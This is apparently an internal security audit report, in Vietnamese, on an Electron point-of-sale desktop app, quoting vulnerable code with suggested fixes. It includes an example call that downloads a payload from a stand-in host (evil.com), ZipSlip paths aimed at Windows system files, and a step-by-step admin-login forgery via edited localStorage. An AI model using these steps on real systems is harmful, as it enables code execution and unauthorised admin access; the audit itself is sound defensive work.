# BÁO CÁO KIỂM TRA BẢO MẬT

> **App:** DBY POS Desktop (Quản lý bán hàng)
> **Ngày kiểm:** 2026-05-06
> **Phiên bản:** 1.0.287
> **Phạm vi:** Bảo mật, mất dữ liệu, hiệu năng, bug

---

## 🔴 #1 — Reset mật khẩu KHÔNG hash (PLAINTEXT)

**Mức độ:** CRITICAL — Mất dữ liệu / Bảo mật
**Trạng thái:** ✅ ĐÃ XÁC NHẬN BUG

**Vị trí:** `electron/ipc-handlers.js:4263-4285`

**Code lỗi:**
```js
// Reset password (admin resets another user's password)
ipcMain.handle('users:resetPassword', async (event, { userId, newPassword }) => {
    requireRole('admin');
    const user = await prisma.user.findUnique({ where: { id: userId } });
    ...
    // Update password
    await prisma.user.update({
        where: { id: userId },
        data: { password: newPassword }   // ❌ LƯU PLAINTEXT
    });
});
```

**So sánh với các handler khác (đều hash đúng):**
- `users:changePassword` (line 4247): `bcrypt.hash(newPassword, 10)` ✅
- `users:create` (line 6845): `bcrypt.hash(data.password, 10)` ✅
- `users:update` (line 6878): `bcrypt.hash(data.password, 10)` ✅
- `users:ensureAdmin` (line 6994): `bcrypt.hash('admin', 10)` ✅

**Hậu quả:**
- Admin reset mật khẩu cho user → DB lưu mật khẩu dạng văn bản thuần
- Nếu DB bị lộ (backup, hack, người trong nhà thấy file) → lộ ngay mật khẩu các tài khoản đã reset
- Login handler (line 6919-6930) có check `startsWith('$2')` để phân biệt plaintext/hashed → user reset xong vẫn login được, NHƯNG mật khẩu vẫn nằm plaintext cho đến khi họ tự đổi

**Cách sửa (gợi ý):** Thay `data: { password: newPassword }` bằng `data: { password: await bcrypt.hash(newPassword, 10) }`

---

## 🔴 #2 — Auto-update KHÔNG xác thực file tải về (RCE)

**Mức độ:** CRITICAL — Bảo mật / Mất dữ liệu
**Trạng thái:** ✅ ĐÃ XÁC NHẬN BUG (nhiều lỗ hổng cộng dồn)

**Vị trí:** `electron/update-handlers.js:266-479`

### 2a. `downloadUrl` nhận từ renderer, KHÔNG ép phải là GitHub

```js
// preload.js:226
download: (downloadUrl) => ipcRenderer.invoke('update:download', downloadUrl),

// update-handlers.js:266
ipcMain.handle('update:download', async (event, downloadUrl) => {
    ...
    await downloadFile(downloadUrl, zipPath, ...);  // ❌ KHÔNG validate
```

→ Renderer truyền URL gì cũng tải. Nếu app có XSS, kẻ tấn công có thể gọi
`electronAPI.update.download('http://evil.com/payload.zip')` → RCE.

### 2b. KHÔNG kiểm tra checksum/chữ ký

- Không có SHA256, không có signature verify, không có code-signing check
- Download xong → `zip.extractAllTo()` (line 311) → `copyRecursive(sourceDir, appRoot)` (line 383)
- Nếu tài khoản GitHub `yendao444-del/airclean-wms` (line 33-34) bị hack, hoặc DNS/MITM bị tấn công → tải về ZIP độc → ghi đè toàn bộ app

### 2c. ZipSlip / Path Traversal qua AdmZip

```js
zip.extractAllTo(extractDir, true);  // line 311 — KHÔNG validate entry paths
```

`adm-zip` có lịch sử CVE về ZipSlip. ZIP độc có thể chứa entry `../../../Windows/System32/...` → ghi file ra ngoài `extractDir`.

### 2d. Redirect HTTP cho phép downgrade

```js
// line 209
const protocol = currentUrl.startsWith('https') ? https : http;
```

Nếu GitHub redirect (cố tình hoặc bị MITM) sang `http://...` → tải qua HTTP không mã hóa → MITM dễ thay payload.

### 2e. Tự động chạy `.bat` qua VBScript với QUYỀN ADMIN

```js
// line 414
const vbsContent = `Set UAC = CreateObject("Shell.Application")
UAC.ShellExecute """${batPath}""", "", "", "runas", 0`;
```

- `${batPath}` là string concat → nếu `tempDir` chứa ký tự đặc biệt có thể command injection
- `runas` → leo quyền admin → file `.bat` (do ZIP control nội dung) chạy với quyền admin
- Kết quả: bất kỳ file ZIP độc nào (đã pass được tải về) đều được chạy với quyền admin

### Hậu quả tổng:
- **RCE qua XSS:** chỉ cần 1 lỗ hổng XSS nhỏ trong React → toàn bộ máy bị kiểm soát
- **Supply chain attack:** repo GitHub bị hack 1 lần → tất cả khách hàng nhiễm malware
- **Ghi đè backup:** copy đè toàn bộ thư mục cài đặt, không có rollback nếu copy lỗi giữa chừng → app hỏng

---

## 🔴 #3 — Restore backup KHÔNG kiểm tra quyền + ZipSlip + Không rollback

**Mức độ:** CRITICAL — Mất dữ liệu / Bảo mật
**Trạng thái:** ✅ ĐÃ XÁC NHẬN BUG

**Vị trí:** `electron/ipc-handlers.js:4426-4464`

### 3a. KHÔNG có `requireRole('admin')`

```js
ipcMain.handle('system:restore', async (event, backupPath) => {
    // ❌ Không kiểm tra quyền — bất kỳ user nào (kể cả thu ngân) đều restore được
    if (!fs.existsSync(backupPath)) { ... }
    const zip = new AdmZip(backupPath);
    zip.extractAllTo(restoreDir, true);
});
```

### 3b. `backupPath` truyền thẳng từ renderer

User có thể truyền path bất kỳ (`C:\evil.zip`) → restore từ file độc.

### 3c. ZipSlip Path Traversal

```js
const restoreDir = path.join(__dirname, '..');  // = thư mục gốc app
zip.extractAllTo(restoreDir, true);  // overwrite = true
```

ZIP độc có thể chứa entry `..\..\..\Windows\System32\drivers\etc\hosts` → ghi đè file hệ thống. `adm-zip` đã có nhiều CVE về ZipSlip, không có validation thủ công ở đây.

### 3d. Backup DB trước khi restore — NHƯNG không tự rollback nếu lỗi

```js
fs.copyFileSync(dbPath, dbBackupPath);  // Backup OK
zip.extractAllTo(restoreDir, true);     // Nếu lỗi giữa chừng?
```

Nếu `extractAllTo` lỗi sau khi đã ghi đè 50% files → app hỏng + DB cũ vẫn còn ở `dev.backup.{timestamp}.db` nhưng KHÔNG có code khôi phục tự động. User phải tự rename file.

### 3e. Restore ghi đè CẢ thư mục `electron/` và `prisma/schema.prisma`

`restoreDir = path.join(__dirname, '..')` = thư mục gốc, gồm code Electron. ZIP backup CŨ với schema khác → có thể làm app crash sau restore.

---

## 🔴 #4 — Bulk delete / deleteAll thiếu phân quyền (KHÔNG NHẤT QUÁN)

**Mức độ:** HIGH — Mất dữ liệu
**Trạng thái:** ✅ ĐÃ XÁC NHẬN BUG

**Vị trí:** `electron/ipc-handlers.js`

| Handler | Dòng | Có `requireRole`? |
|---|---|---|
| `einvoice:bulkDelete` | 8209 | ✅ admin |
| `einvoice:deleteAll` | 8233 | ✅ admin |
| `ecommerceExports:bulkDelete` | 5786 | ❌ **KHÔNG** |
| `ecommerceExports:deleteAll` | 5841 | ❌ **KHÔNG** |
| `ecommerceExports:deleteCancelled` | 5866 | ❌ **KHÔNG** |
| `refunds:bulkDelete` | 6413 | ❌ **KHÔNG** |
| `system:restore` | 4426 | ❌ **KHÔNG** (đã ghi ở #3) |

→ Bất kỳ user nào (kể cả thu ngân, nhân viên kho) đăng nhập vào đều có thể:
- Xóa **tất cả** đơn TMDT (`deleteAll`) → mất dữ liệu báo cáo
- Xóa hàng loạt hàng hoàn → mất chứng từ
- Xóa hàng loạt đơn TMDT đã hoàn thành → ngoài việc mất dữ liệu, còn cộng nhầm tồn kho (logic ở line 5800-5821 chạy mà không check ai trigger)

### 4b. `ecommerceExports:deleteAll` — không có rollback nếu loop lỗi

```js
const completedDocs = await tx.ecommerceExport.findMany({ where: { status: 'completed' } });
for (const doc of completedDocs) {
    await ensureMarketplaceOrderInTx(tx, doc, ...);  // Nếu lỗi giữa chừng?
}
const deleted = await tx.ecommerceExport.deleteMany({});
```

Có `$transaction` nên Prisma sẽ rollback, NHƯNG vì không phân quyền nên user có thể call repeated → DoS.

### 4c. Comment "TEST ONLY" còn trong production

```js
// ⚠️ TEST ONLY — Xóa toàn bộ HĐĐT (sẽ tắt sau khi test xong)
ipcMain.handle('einvoice:deleteAll', ...)
```

Lập trình viên đã ghi chú ý định tắt nhưng VẪN còn trong v1.0.287.

---

## 🟠 #5 — Auto-login từ localStorage không xác thực lại

**Mức độ:** HIGH — Bảo mật
**Trạng thái:** ✅ ĐÃ XÁC NHẬN BUG

**Vị trí:** `src/contexts/AuthContext.tsx:36-48` + `electron/ipc-handlers.js:6957-6968`

```js
// AuthContext.tsx
const rememberedUser = localStorage.getItem('rememberedUser');
if (rememberedUser) {
    const parsed = JSON.parse(rememberedUser);
    setUser(parsed);                                    // ❌ Trust ngay
    sessionStorage.setItem('currentUser', rememberedUser);
    window.electronAPI.users.restoreSession(parsed.id).catch(() => {});  // ❌ Silent fail
    return;
}

// ipc-handlers.js:6957
ipcMain.handle('users:restoreSession', async (event, userId) => {
    const user = await prisma.user.findUnique({ where: { id: userId } });
    if (!user || user.status !== 'active') return { success: false };
    currentSession = { id: user.id, username: user.username, role: user.role };
    // ❌ Không yêu cầu password / token / signature gì cả
});
```

### Kịch bản tấn công cụ thể:
1. Mở thư mục cài đặt (Electron lưu localStorage tại `%AppData%\<appName>\Local Storage\`)
2. Edit file LevelDB → đổi `rememberedUser` thành `{"id": 1, "role": "admin", ...}`
3. Mở app → tự động login với quyền **admin** mà KHÔNG cần mật khẩu
4. Cả `restoreSession` ở backend cũng accept (vì user id 1 thường là admin và active)

### Vấn đề bổ sung:
- `setUser(parsed)` line 41 chạy NGAY → UI hiển thị "admin" trước khi backend trả lời
- `restoreSession().catch(() => {})` — nếu backend từ chối, UI **vẫn** hiển thị logged in
- Code chỉ lưu admin (line 80-81) nhưng kẻ tấn công có thể tự ghi role admin vào localStorage

---

## 🟠 #6 — Legacy plaintext password (auto-upgrade) còn nhận đăng nhập

**Mức độ:** MEDIUM — Bảo mật
**Trạng thái:** ✅ ĐÃ XÁC NHẬN

**Vị trí:** `electron/ipc-handlers.js:6919-6930`

```js
const isHashed = typeof user.password === 'string' && user.password.startsWith('$2');
let passwordValid = false;
if (isHashed) {
    passwordValid = await bcrypt.compare(password, user.password);
} else {
    // Backward compatible: plaintext password cũ → auto-upgrade sang hash
    passwordValid = (user.password === password);   // ❌ So sánh plaintext
    if (passwordValid) {
        const hashed = await bcrypt.hash(password, 10);
        await prisma.user.update({ where: { id: user.id }, data: { password: hashed } });
    }
}
```

### Vấn đề:
- Cộng hưởng với **bug #1**: mỗi lần admin reset password (lưu plaintext) → user đăng nhập lần đầu thì auto-upgrade. Nhưng giữa lúc reset và lúc user login, mật khẩu nằm plaintext trong DB
- Nếu DB backup/đồng bộ lên Google Drive trong khoảng thời gian này → mật khẩu bị lưu vĩnh viễn ở plaintext trong backup
- Không có "force re-login khi reset" nên cửa sổ tấn công có thể kéo dài nhiều ngày

---

## 🟠 #7 — Session không có timeout, không validate per-request

**Mức độ:** MEDIUM — Bảo mật
**Trạng thái:** ✅ ĐÃ XÁC NHẬN

**Vị trí:** `electron/ipc-handlers.js:468-477`

```js
let currentSession = null; // { id, username, role }

function requireRole(...roles) {
    if (!currentSession) throw new Error('Chưa đăng nhập');
    if (roles.length > 0 && !roles.includes(currentSession.role)) {
        throw new Error(`Không có quyền...`);
    }
}
```

### Vấn đề cụ thể:

1. **Session là biến global trong main process** → toàn app chỉ có 1 session active. Nếu app multi-user trên cùng máy không hoạt động đúng.

2. **Không có TTL/timeout** — đăng nhập 1 lần, đứng dậy đi ăn trưa, bất kỳ ai trên máy đó đều có quyền của user đang đăng nhập. POS thường để máy mở cả ngày → rủi ro cao.

3. **Heartbeat (line 6970-6978) chỉ cập nhật `lastActiveAt`, không xác thực gì cả** — nếu kẻ tấn công can thiệp vào main process (ví dụ qua DevTools mở được vì line 253) thì vô hiệu.

4. **Login tại line 6932 không có rate limit / lockout** — có thể brute force username `admin` không giới hạn.

5. **Username chỉ trim, không validate length** (line 6911) — string siêu dài có thể gây slow query trên Prisma.

### Tổng hợp risk #5+#6+#7:
Một user có quyền truy cập máy POS có thể: edit localStorage → auto-login admin → không bị logout → có toàn quyền xóa data.

---

## ⏳ Đang chờ kiểm tra

- [ ] #8 — Google Drive token lưu plaintext trên đĩa
- [ ] #9 — Hiệu năng: N+1 queries, getAll không phân trang
- [ ] #10 — Race condition cập nhật tồn kho
